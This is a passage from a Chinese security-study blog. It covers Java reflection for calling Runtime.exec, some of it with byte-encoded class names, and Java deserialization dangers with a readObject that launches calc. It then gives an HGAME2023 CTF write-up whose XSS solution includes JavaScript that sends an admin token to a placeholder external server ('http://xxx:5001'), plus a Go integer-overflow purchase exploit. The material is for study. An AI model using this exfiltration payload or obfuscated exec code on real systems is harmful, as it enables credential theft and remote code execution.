通过设置<code>setAccessible(true)</code>来访问非<code>public</code>构造方法。</li></ol></blockquote><h2 id="反射java-lang-Runtime"><a href="#反射java-lang-Runtime" class="headerlink" title="反射java.lang.Runtime"></a>反射java.lang.Runtime</h2><p>之前在URLClassLoader的部分我们提到java.lang.Runtime有一个exec方法可以执行我们本地的命令，所有这里我们尝试用反射的方式来调用其中的exec方法执行命令</p><pre class="language-java" data-language="java"><code class="language-java">import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class TestRuntime &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        &#x2F;&#x2F; 获取Runtime的类对象        Class&lt;?&gt; r &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);        &#x2F;&#x2F;可以跟进去发现Runtime的构造方法不是public的，需要改访问权限        Constructor&lt;?&gt; declaredConstructor &#x3D; r.getDeclaredConstructor();        declaredConstructor.setAccessible(true);        Runtime o &#x3D; (Runtime)declaredConstructor.newInstance();        &#x2F;&#x2F; 获取调用方法        Method exec &#x3D; r.getMethod(&quot;exec&quot;, String[].class);        Process cmd &#x3D; (Process)exec.invoke(o, (Object) new String[]&#123;&quot;cmd&quot;, &quot;&#x2F;c&quot;, &quot;dir&quot;&#125;);        &#x2F;&#x2F;到这里其实已经执行成功了，但是如果执行的是有回显的命令时，还需要把命令回显出来        InputStream inputStream &#x3D; cmd.getInputStream();        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();        int a &#x3D; -1;        byte[] b &#x3D; new byte[1024];        while ((a &#x3D; inputStream.read(b)) !&#x3D; -1)&#123;            baos.write(b,0,a);        &#125;        System.out.println(baos);    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230317131148484.png" alt="image-20230317131148484"></p><p>也可以用ASCII码的形式</p><pre class="language-java" data-language="java"><code class="language-java">        String[] str &#x3D; new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;dir&quot;&#125;;        &#x2F;&#x2F; 定义&quot;java.lang.Runtime&quot;字符串变量        String rt &#x3D; new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;);        &#x2F;&#x2F; 反射java.lang.Runtime类获取Class对象        Class&lt;?&gt; c &#x3D; Class.forName(rt);        &#x2F;&#x2F; 反射获取Runtime类的getRuntime方法        Method m1 &#x3D; c.getMethod(new String(new byte[]&#123;103, 101, 116, 82, 117, 110, 116, 105, 109, 101&#125;));        &#x2F;&#x2F; 反射获取Runtime类的exec方法        Method m2 &#x3D; c.getMethod(new String(new byte[]&#123;101, 120, 101, 99&#125;), String[].class);        &#x2F;&#x2F; 反射调用Runtime.getRuntime().exec(xxx)方法        Process obj2 &#x3D; (Process)m2.invoke(m1.invoke(null), (Object) str);&#x2F;&#x2F;        &#x2F;&#x2F; 反射获取Process类的getInputStream方法        &#x2F;&#x2F; 反射获取Process类的getInputStream方法  等价于Method m &#x3D; obj2.getClass().getMethod(&quot;getInputStream&quot;);        Method m &#x3D; obj2.getClass().getMethod(new String(new byte[]&#123;103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109&#125;));        m.setAccessible(true);&#x2F;&#x2F;&#x2F;&#x2F;        &#x2F;&#x2F; 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串        Scanner s &#x3D; new Scanner((InputStream) m.invoke(obj2, new Object[]&#123;&#125;),&quot;GBK&quot;);        while (s.hasNext())&#123;            System.out.println(s.next());        &#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230317170243417.png" alt="image-20230317170243417"></p><p>还可以使用ProcessBuilder或UNIXProcess/ProcessImpl执行命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230317171619043.png" alt="image-20230317171619043"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下常用方法</p><pre class="language-text" data-language="text"><code class="language-text">&#x2F;&#x2F;获取包名、类名clazz.getPackage().getName()&#x2F;&#x2F;包名clazz.getSimpleName()&#x2F;&#x2F;类名clazz.getName()&#x2F;&#x2F;完整类名 &#x2F;&#x2F;获取成员变量定义信息getFields()&#x2F;&#x2F;获取所有公开的成员变量,包括继承变量getDeclaredFields()&#x2F;&#x2F;获取本类定义的成员变量,包括私有,但不包括继承的变量getField(变量名)getDeclaredField(变量名) &#x2F;&#x2F;获取构造方法定义信息getConstructor(参数类型列表)&#x2F;&#x2F;获取公开的构造方法getConstructors()&#x2F;&#x2F;获取所有的公开的构造方法getDeclaredConstructors()&#x2F;&#x2F;获取所有的构造方法,包括私有getDeclaredConstructor(int.class,String.class) &#x2F;&#x2F;获取方法定义信息getMethods()&#x2F;&#x2F;获取所有可见的方法,包括继承的方法getMethod(方法名,参数类型列表)getDeclaredMethods()&#x2F;&#x2F;获取本类定义的的方法,包括私有,不包括继承的方法getDeclaredMethod(方法名,int.class,String.class) &#x2F;&#x2F;反射新建实例clazz.newInstance();&#x2F;&#x2F;执行无参构造创建对象clazz.newInstance(222,&quot;韦小宝&quot;);&#x2F;&#x2F;执行有参构造创建对象clazz.getConstructor(int.class,String.class)&#x2F;&#x2F;获取构造方法 &#x2F;&#x2F;反射调用成员变量clazz.getDeclaredField(变量名);&#x2F;&#x2F;获取变量clazz.setAccessible(true);&#x2F;&#x2F;使私有成员允许访问f.set(实例,值);&#x2F;&#x2F;为指定实例的变量赋值,静态变量,第一参数给nullf.get(实例);&#x2F;&#x2F;访问指定实例变量的值,静态变量,第一参数给null &#x2F;&#x2F;反射调用成员方法Method m &#x3D; Clazz.getDeclaredMethod(方法名,参数类型列表);m.setAccessible(true);&#x2F;&#x2F;使私有方法允许被调用m.invoke(实例,参数数据);&#x2F;&#x2F;让指定实例来执行该方法</code></pre><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><blockquote><p>java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。</p></blockquote><ol><li>Java 提供了一种对象序列化的机制，该机制中，<strong>一个对象可以被表示为一个字节序列</strong>，该字节序列包括该对象的<strong>数据、有关对象的类型的信息和存储在对象中数据的类型</strong>。即序列化是指把一个Java对象变成二进制内容，本质上就是一个<code>byte[]</code>数组。</li><li>为什么要把Java对象序列化呢？因为序列化后可以把<code>byte[]</code>保存到文件中，或者把<code>byte[]</code>通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。</li><li>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是<code>byte[]</code>数组）变回Java对象。有了反序列化，保存到文件中的<code>byte[]</code>数组又可以“变回”Java对象，或者从网络上读取<code>byte[]</code>并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。</li><li>整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</li><li>Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。</li></ol><p>java对象实现序列化的<strong>前提</strong>是必须实现一个特殊的<code>java.io.Serializable</code>接口</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318141741509.png" alt="image-20230318141741509"></p><p>这个接口没有定义任何方法，只是一个空接口，也被叫做&quot;标记接口&quot;，实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。</p><p>就像php中有serialize和unserialize函数负责序列化和反序列化一样，Java也有<strong>writeObject</strong>和<strong>readObject</strong>负责序列化和反序列化，他们分别属于<code>ObjectInputStream</code> 和 <code>ObjectOutputStream</code> 这两个高层次的数据流</p><blockquote><p>静态成员变量不能被序列化，序列化是针对对象属性的，而静态变量属于类</p><p>transient标识的对象成员变量不参与序列化</p></blockquote><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>序列化步骤：</p><blockquote><p>把对象转换为字节序列</p></blockquote><ul><li>步骤一：创建一个ObjectOutputStream输出流</li><li>步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。</li></ul><p>反序列化步骤</p><blockquote><p>把字节序列转换为对象</p></blockquote><ul><li>步骤一：创建一个ObjectInputStream输入流；</li><li>步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。</li></ul><p>代码实现</p><pre class="language-java" data-language="java"><code class="language-java">package serializTest;import java.io.*;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;public class Run &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        SerializeDemo serializeDemo &#x3D; new SerializeDemo();        serializeDemo.x &#x3D; 123;        Path path &#x3D; Paths.get(&quot;1.ser&quot;);        &#x2F;&#x2F;序列化        &#x2F;&#x2F; 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(Files.newOutputStream(path));                &#x2F;&#x2F; 调用writeObject方法，序列化对象到文件1.ser中        objectOutputStream.writeObject(serializeDemo);        objectOutputStream.close();        &#x2F;&#x2F;反序列化                &#x2F;&#x2F;  创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(Files.newInputStream(path));                    &#x2F;&#x2F; 调用readObject从1.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型        SerializeDemo serializeDemo1 &#x3D; (SerializeDemo) objectInputStream.readObject();        System.out.println(serializeDemo1.add(1,2));    &#125;&#125;class SerializeDemo implements Serializable &#123;   &#x2F;&#x2F; 必须要实现Serializable这个接口，可以不用里面的方法    public int x;    public int add(int a,int b)&#123;        return a+b+x;    &#125;&#125;</code></pre><p>输出可以看出x的值是序列化之前的123，也就是通过序列化存储的信息可以重新通过反序列化得到恢复</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318143751540.png" alt="image-20230318143751540"></p><p>序列化后的内容是无法正常查看的</p><p>但是我们可以在十六进制的内容中得到一点信息，比如前八位中</p><p><strong>AC ED</strong>：<code>STREAM_MAGIC</code>，声明使用了序列化协议，<strong>从这里可以判断保存的内容是否为序列化数据。</strong> （这是在黑盒挖掘反序列化漏洞很重要的一个点）</p><p><strong>00 05</strong>：<code>STREAM_VERSION</code>，序列化协议版本。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318143831170.png" alt="image-20230318143831170"></p><p>也可以存到 bytes数组中</p><pre class="language-java" data-language="java"><code class="language-java">package serializTest;import java.io.*;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Arrays;public class Run &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        SerializeDemo serializeDemo &#x3D; new SerializeDemo();        serializeDemo.x &#x3D; 666;        &#x2F;&#x2F; 序列化        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();  &#x2F;&#x2F; 本体        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream); &#x2F;&#x2F; 只是一个装饰器的作用 Filter模式        objectOutputStream.writeObject(serializeDemo);        objectOutputStream.close();        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));        &#x2F;&#x2F; 反序列化        ByteArrayInputStream byteArrayInputStream &#x3D; new ByteArrayInputStream(byteArrayOutputStream.toByteArray());        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(byteArrayInputStream);        SerializeDemo serializeDemo1 &#x3D; (SerializeDemo)objectInputStream.readObject();        objectInputStream.close();        System.out.println(serializeDemo1.add(1, 2));    &#125;&#125;class SerializeDemo implements Serializable &#123;   &#x2F;&#x2F; 必须要实现Serializable这个接口，可以不用里面的方法    public int x;    public int add(int a,int b)&#123;        return a+b+x;    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318144835373.png" alt="image-20230318144835373"></p><h2 id="反序列化的安全问题"><a href="#反序列化的安全问题" class="headerlink" title="反序列化的安全问题"></a>反序列化的安全问题</h2><p>我们看到反序列化可以恢复序列化时对属性的赋值，那如果我们构造一个恶意的序列化文件替换掉系统自动生成的序列化文件，或者直接在反序列化的位置上传一个构造好的恶意byte数组，就会让系统中出现我们构造的内容，从而造成一些安全漏洞</p><blockquote><p>实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。</p></blockquote><p>​        <strong>同时，为了能够更加灵活的传输内容，Java允许用户进行重写    writeObject和readObject方法。也就是说，如果服务端反序列化数据，客户端传递的类中的readObject方法中的代码就会执行，让攻击者可以在服务器上运行自己的代码</strong></p><p>在调用readObject方法时会执行到ObjectStreamClass类里的invokeReadObject方法，里面通过反射调用了客户端传递的类中的readObject方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320100550420.png" alt="image-20230320100550420"></p><p>其中obj就是我们传入的类，而readObjectMethod属性通过反射成为了传递的类的readObject方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320101449068.png" alt="image-20230320101449068"></p><p>in就是我们序列化后的内容</p><p>所以假设我们传递的类是AnnotationInvocationHandler类，那么readObjectMethod.invoke(obj, new Object[]{ in });实质上等价于</p><pre class="language-java" data-language="java"><code class="language-java">sun.reflect.annotation.AnnotationInvocationHandler.readObject.invoke(AnnotationInvocationHandler,new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))))</code></pre><h2 id="可能的形式"><a href="#可能的形式" class="headerlink" title="可能的形式"></a>可能的形式</h2><p><strong>1.入口类的readObject直接调用危险方法</strong></p><p>我在SerializeDemo类中加入一个readObject类，其余部分不变，再次执行程序</p><pre class="language-java" data-language="java"><code class="language-java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;    ois.defaultReadObject();    Runtime.getRuntime().exec(&quot;calc&quot;);&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318154541243.png" alt="image-20230318154541243"></p><p><strong>2.入口类参数中包含可控类，该类有危险方法，readObject时调用</strong></p><p><strong>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</strong></p><p><strong>4.构造函数/静态代码块等类加载时隐性执行</strong></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>共同条件 继承Serializable</p><p>入口类 source （需要重写readObject方法，参数类型宽泛，最好jdk自带）（Map）</p><p>调用链 gadget chain</p><p>执行类 sink</p><h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>关于代理首先需要了解代理模式，根据代理类的创建时间又可以分为静态代理和动态代理。</p><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>定义：为其他对象提供一种代理以控制对这个对象的访问</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318210211597.png" alt="image-20230318210211597"></p><p>代理模式的通用类图</p><p>上图中，Subject是一个抽象类或者接口，RealSubject是实现方法类，具体的业务执行，Proxy则是RealSubject的代理，直接和client接触的。</p><p>代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。值得注意的是，代理类和被代理类应该共同实现一个接口，或者是共同继承某个类。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>职责清晰</p><p>在不更改原类的基础上扩展功能</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>代理模式是在不修改目标对象(被代理对象)的基础上，通过代理对象（扩展代理类)，进行一些功能的附加与增强——&gt;静态代理是在不改变源代码的基础上增加新的功能。 </p><p><strong>特点</strong></p><pre><code>    （1）静态代理要求目标对象和代理对象实现同一个业务接口。代理对象中的核心功能是由目标对象来完成，代理对象负责增强功能。    （2）目标对象(被代理对象)必须实现接口。    （3）代理对象在程序运行前就已经存在——&gt;扩展代理类Agent。    （4）支持目标对象灵活的切换，无法对功能灵活的处理——&gt;动态代理可解决此问题。</code></pre><p><strong>例子</strong></p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; Iuser接口public interface Iuser &#123;    void show();&#125;</code></pre><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; 代理类public class UserProxy implements Iuser&#123;    Iuser user;    public UserProxy(User user) &#123;        this.user &#x3D; user;    &#125;    @Override    public void show() &#123;        user.show();        System.out.println(&quot;proxy&quot;);    &#125;&#125;</code></pre><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; 实现类public class User implements Iuser&#123;    @Override    public void show() &#123;        System.out.println(&quot;user&quot;);    &#125;&#125;</code></pre> <pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; 测试类public class ProxyTest &#123;    public static void main(String[] args) &#123;        User user &#x3D; new User();&#x2F;&#x2F;        user.show();        &#x2F;&#x2F;假如静态代理，就需要下面这种写法        UserProxy userProxy &#x3D; new UserProxy(user);        userProxy.show();    &#125;&#125;</code></pre><p>从上边的例子应该也不难看出，静态代理存在一些缺陷</p><ol><li>代理复杂，难于管理</li></ol><blockquote><p>​    代理类和目标类实现了相同的接口，每个代理都需要实现目标类的方法，这样就出现了大量的代码重复。如果接口增加一个方法，除了所有目标类需要实现这个方法外，所有代理类也需要实现此方法。——&gt;增加了代码维护的复杂度。 </p></blockquote><ol start="2"><li>代理类依赖目标类+代理类过多</li></ol><blockquote><p>​        代理类只服务于一种类型的目标类，如果要服务多个类型。势必要为每一种目标类都进行代理，静态代理在程序规模稍大时就无法胜任了，代理类数量过多。</p></blockquote><p>静态代理只适合业务功能固定不变的情况。(业务接口方法不进行增加和减少，实现类就不需要改动)</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>相比于静态代理来说，动态代理更加灵活。不需要针对每个目标类都单独创建一个代理类，并且也不需要实现接口直接代理实现类。动态代理类的字节码在程序运行时，运用反射机制动态创建而成。<br> 动态代理在日志、监控、事务中，主流框架中都有着广泛的应用。动态代理一般有两种实现方式：</p><ul><li>JDK动态代理：利用接口实现代理</li><li>CGLIB动态代理：利用继承的方式实现代理</li></ul><h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h3><p>JDK的动态代理是通过实现接口的方式</p><p>主要涉及java.lang.reflect包下的Proxy类和InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。</p><h3 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h3><p>首先通过Proxy.newProxyInstance创建代理类对象</p><p>这里要传入三个参数，分别是一个类加载器、我们要代理的接口以及一个InvocationHandler对象 ，其中InvocationHandler对象负责的是我们要做的事</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318224242916.png" alt="image-20230318224242916"></p><p>这里主要说一下第三个参数</p><blockquote><p>InvocationHandler 是一个接口，每个代理的实例都有一个与之关联的 InvocationHandler 实现类，如果代理的方法被调用，那么代理便会通知和转发给内部的 InvocationHandler 实现类，由它决定处理。</p></blockquote><p>要有一个InvocationHandler的对象，肯定是先需要去实现这个接口</p><p>这个接口自身只有一个invoke方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318225428247.png" alt="image-20230318225428247"></p><p>其中的三个参数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318225714943.png" alt="image-20230318225714943"></p><p>这里proxy和method都是系统负责获取的，最后一个参数对象数组就是我们真正要代理的对象，这里可以先定义这个对象然后通过构造函数给它赋值</p><pre class="language-java" data-language="java"><code class="language-java">import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserInvocationHandler implements InvocationHandler &#123;    Iuser user;    public UserInvocationHandler(Iuser iuser)&#123;        this.user &#x3D; iuser;    &#125;    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        &#x2F;&#x2F; 无论外部传入什么，都会捕获到，然后作为method传入        method.invoke(user,args);        return null;    &#125;&#125;</code></pre><p>此时在测试类里，我们需要创建一个UserInvocationHandler的对象，需要的参数就是我们实际上操作的user对象。</p><p>创建完成后，Proxy.newProxyInstance所需要的三个参数我们便准备完成了，之后再进行传参然后再将返回值强制类型转换就可以了。</p><p>这时候就可以通过转换类型后的返回值来操控user类中的方法了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318231006763.png" alt="image-20230318231006763"></p><p>我们对o传入的方法都会被UserInvocationHandler捕获，然后作为method参数，以反射的方式去调用。</p><p>动态代理不需要单独创建代理类，但是需要创建一个实现InvocationHandler接口的调用处理程序类</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li>静态代理，代理类需要自己编写代码写成。</li><li>动态代理，代理类通过 Proxy.newInstance() 方法生成。</li><li>JDK实现的代理中不管是静态代理还是动态代理，代理与被代理者都要实现两样接口，它们的实质是面向接口编程。CGLib可以不需要接口。</li><li>动态代理通过 Proxy 动态生成 proxy class，但是它也指定了一个 InvocationHandler 的实现类。</li></ol><h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋所创建的。它已加入了开放源代码JBoss 应用服务器项目</p><p>通过javasssit，我们可以：</p><ul><li>动态创建新类或新接口的二进制字节码</li><li>动态扩展现有类或接口的二进制字节码(AOP)</li></ul><p>Javassist中最为重要的是ClassPool，CtClass ，CtMethod 以及 CtField这几个类。</p><p>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</p><p>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</p><p>CtMethods：表示类中的方法。</p><p>CtFields ：表示类中的字段。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2023 wp</title>
      <link href="/2023/02/06/HGAME2023-wp/"/>
      <url>/2023/02/06/HGAME2023-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h2><blockquote><p>题目描述：请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206224428482.png" alt="image-20230206224428482"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206223941914.png" alt="image-20230206223941914"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206223924045.png" alt="image-20230206223924045"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230206224312727.png" alt="image-20230206224312727"></p><h2 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h2><p>xss注入的题</p><p>首先要拿到flag就要求注册的时候post的数据为admin，而且还要是本地的ip，修改xff无果</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003404602.png" alt="image-20230207003404602"></p><p>给的源码里的share的部分，就是在本地访问preview这个路由里的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003324707.png" alt="image-20230207003324707"></p><p>之后在preview里，过滤了一些xss的关键数据，从这里也能看出这道题就是利用xss，让本地访问的那个机器人去访问register路由，然后把得到的内容外带出来。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003512737.png" alt="image-20230207003512737"></p><p>接下来就是找从哪里进行xss。</p><p>在preview.ejs中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003646161.png" alt="image-20230207003646161"></p><p>使用了&lt;%-，这个和&lt;%=的区别就是不会进行html的实体编码，也就可以进行xss的操作</p><p>这里进行过滤的时候只将值清空了，但是并没有改变键，所以可以这样进行xss</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207003945121.png" alt="image-20230207003945121"></p><p>接下来就是让其访问register路由了</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">,</span><span class="token string">'http://127.0.0.1:9090/user/register'</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>h <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>url <span class="token operator">=</span> <span class="token string">"http://xxx:5001?token="</span><span class="token operator">+</span>h<span class="token punctuation">;</span><span class="token keyword">var</span> xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>放到服务器上然后让题目本地的机器人去访问服务器上的这个文件，就会执行里面的js代码，访问本地的9090端口下的/user/register，然后把返回的内容以参数的形式发送到服务器上</p><p>作为键或者作为值都行，因为并没有被过滤的关键字</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207004326111.png" alt="image-20230207004326111"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207002949668.png" alt="image-20230207002949668"></p><h2 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h2><blockquote><p>题目描述:今天是大年初二！兔兔迈着开心的步伐走到了一教，据说每逢寒假HGAME期间，300b就会有Vidar大商场，每个进入商场的同学都可以领取10个Vidar币。兔兔在一家叫Gopher Shop的商店面前停下了脚步，Gopher？听说协会的Web手们都会一点Go,也许这是协会学长开的吧。望着橱窗里的商品，攥着手里的10个Vidar币，兔兔走进了商店...</p></blockquote><p>考察go语言uint类型的整数溢出问题</p><p> uint类型在64位机器上的最大值为18446744073709551615，最小值为0，超出的部分就会溢出</p><p>购买部分逻辑如下：</p><p> <img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207163300926.png" alt="image-20230207163300926"></p><p>这里uint(number)*price就有可能导致溢出的产生</p><p>若购买1844674407370955162个苹果，与价格相乘后会变为18446744073709551620，导致溢出变为4（0，1，2，3，4实际上是溢出了五）</p><p>这时4小于我们原有的10硬币，就可以买到1844674407370955162个苹果，然后再卖出就可以有钱买flag了（卖的时候也要注意溢出</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207164534678.png" alt="image-20230207164534678"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207164611751.png" alt="image-20230207164611751"></p><p>钱不够就多买几次再卖出去，这里前端显示的内容和实际的数量不一样，因为前端把后边的部分舍了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207165210688.png" alt="image-20230207165210688"></p><h2 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h2><blockquote><p>Just tell me your thoughts</p></blockquote><p>xxe的题目</p><p>标准的无回显xxe</p><p><img 